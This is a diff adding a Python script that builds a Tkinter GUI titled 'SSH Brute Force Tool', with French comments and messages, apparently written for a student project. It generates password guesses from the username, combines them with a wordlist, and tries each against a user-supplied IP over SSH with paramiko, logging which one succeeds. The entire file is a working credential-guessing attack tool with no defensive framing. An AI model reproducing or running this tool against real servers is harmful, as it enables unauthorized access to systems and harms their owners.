@@ -1,0 +1,149 @@
+import paramiko
+import tkinter as tk
+from tkinter import filedialog, messagebox
+import threading
+import os
+from PIL import Image, ImageTk  # Pour gérer l'image
+
+# Ajouter des variantes de mots de passe basées sur le nom d'utilisateur
+def generate_password_variants(username):
+    variants = [
+        username,
+        username + '123', username + '!', username + '2023',
+        username + '1234', '123' + username, '!' + username,
+        username.capitalize(), username[::-1],  # reverse
+        username + '01', username + '02', username + '03',
+        username + '_123', username + '_!', username + '_2023',
+        username + '_2024', username + 'password', 'password' + username,
+        username + '01!', username + '02!', username + '03!',
+        username + 'admin', username + 'admin123', 'admin' + username,
+        username + 'root', 'root' + username, username + 'user',
+        'user' + username, username + 'test', 'test' + username,
+        username + '_test', 'test_' + username, username + 'guest',
+        'guest' + username, username + 'guest123', 'guest123' + username,
+        username + '!2023', username + '!2024', username + '!1234',
+        username + '!password'
+    ]
+    return variants
+
+def ssh_brute_force(ip, username, password_file, output_text):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        with open(password_file, 'r') as file:
+            passwords = file.readlines()
+    except FileNotFoundError:
+        output_text.insert(tk.END, "[!] Fichier de mots de passe introuvable.\n")
+        return None
+    except Exception as e:
+        output_text.insert(tk.END, f"[!] Erreur lors de la lecture du fichier de mots de passe : {e}\n")
+        return None
+
+    password_variants = generate_password_variants(username)
+    all_passwords = password_variants + [pwd.strip() for pwd in passwords]
+
+    log_content = f"Lancement de l'attaque par force brute sur l'adresse IP {ip} avec l'utilisateur {username}\n\n"
+    password_found = False
+    for password in all_passwords:
+        try:
+            ssh.connect(ip, username=username, password=password)
+            log_content += f"[+] Mot de passe trouvé : {password}\n"
+            output_text.insert(tk.END, f"Mot de passe déniché : {password}\n", "success")
+            password_found = True
+            break
+        except paramiko.AuthenticationException:
+            log_content += f"[-] Mot de passe échoué : {password}\n"
+            output_text.insert(tk.END, f"Impossible de trouver le mot de passe : {password}\n", "failure")
+        except paramiko.SSHException as sshException:
+            log_content += f"[!] Erreur SSH : {sshException}\n"
+            output_text.insert(tk.END, f"[!] Erreur SSH : {sshException}\n")
+            break
+        except Exception as e:
+            log_content += f"[!] Erreur inattendue : {e}\n"
+            output_text.insert(tk.END, f"[!] Erreur inattendue : {e}\n")
+            break
+        finally:
+            ssh.close()
+
+    if password_found:
+        log_content += "\n[+] L'attaque par force brute a été couronnée de succès et le mot de passe a été récupéré avec succès.\n"
+    else:
+        log_content += "\n[-] L'attaque par force brute a été menée, mais elle n'a pas abouti.\n"
+
+    save_log(log_content)
+
+def save_log(content):
+    log_dir = r"C:\Users\Yanis Sekhri\Documents\Projet SDV M1\result-bruteforce"
+    os.makedirs(log_dir, exist_ok=True)
+    log_path = os.path.join(log_dir, "bruteforce_log.txt")
+
+    with open(log_path, 'w') as log_file:
+        log_file.write(content)
+
+    if messagebox.askyesno("Log Saved", "Le fichier de log est enregistré. Voulez-vous l'ouvrir ?"):
+        os.startfile(log_path)
+    else:
+        if messagebox.askyesno("Log Saved", "Le fichier de log est enregistré. Voulez-vous le supprimer ?"):
+            os.remove(log_path)
+            messagebox.showinfo("Log Deleted", "Le fichier de log a été supprimé.")
+        else:
+            messagebox.showinfo("Log Kept", f"Le fichier de log est enregistré à {log_path}")
+
+def start_bruteforce():
+    ip = ip_entry.get()
+    username = username_entry.get()
+    password_file = password_file_path.get()
+
+    if not ip or not username or not password_file:
+        messagebox.showerror("Input Error", "Veuillez remplir tous les champs.")
+        return
+
+    output_text.delete(1.0, tk.END)
+    threading.Thread(target=ssh_brute_force, args=(ip, username, password_file, output_text)).start()
+
+def browse_file():
+    file_path = filedialog.askopenfilename()
+    password_file_path.set(file_path)
+
+# Interface utilisateur Tkinter
+root = tk.Tk()
+root.title("SSH Brute Force Tool")
+root.configure(bg='white')
+
+# Charger l'image
+image_path = r"C:\Users\Yanis Sekhri\Pictures\Brute-Force.jpg"
+img = Image.open(image_path)
+img = img.resize((300, 150), Image.LANCZOS)  # Redimensionner l'image
+photo = ImageTk.PhotoImage(img)
+
+# Ajouter l'image à l'interface utilisateur
+image_label = tk.Label(root, image=photo)
+image_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10)
+
+tk.Label(root, text="IP Address:", bg='white', fg='black').grid(row=1, column=0, padx=10, pady=5)
+ip_entry = tk.Entry(root)
+ip_entry.grid(row=1, column=1, padx=10, pady=5)
+
+tk.Label(root, text="Username:", bg='white', fg='black').grid(row=2, column=0, padx=10, pady=5)
+username_entry = tk.Entry(root)
+username_entry.grid(row=2, column=1, padx=10, pady=5)
+
+tk.Label(root, text="Password File:", bg='white', fg='black').grid(row=3, column=0, padx=10, pady=5)
+password_file_path = tk.StringVar()
+password_file_entry = tk.Entry(root, textvariable=password_file_path)
+password_file_entry.grid(row=3, column=1, padx=10, pady=5)
+browse_button = tk.Button(root, text="Browse", command=browse_file, bg='blue', fg='white')
+browse_button.grid(row=3, column=2, padx=10, pady=5)
+
+start_button = tk.Button(root, text="Start Brute Force", command=start_bruteforce, bg='blue', fg='white')
+start_button.grid(row=4, column=1, pady=10)
+
+output_text = tk.Text(root, height=15, width=70, bg='lightgrey', fg='black')
+output_text.grid(row=5, column=0, columnspan=3, padx=10, pady=10)
+
+# Ajouter des tags pour la coloration du texte
+output_text.tag_configure("success", foreground="green")
+output_text.tag_configure("failure", foreground="red")
+
+root.mainloop()
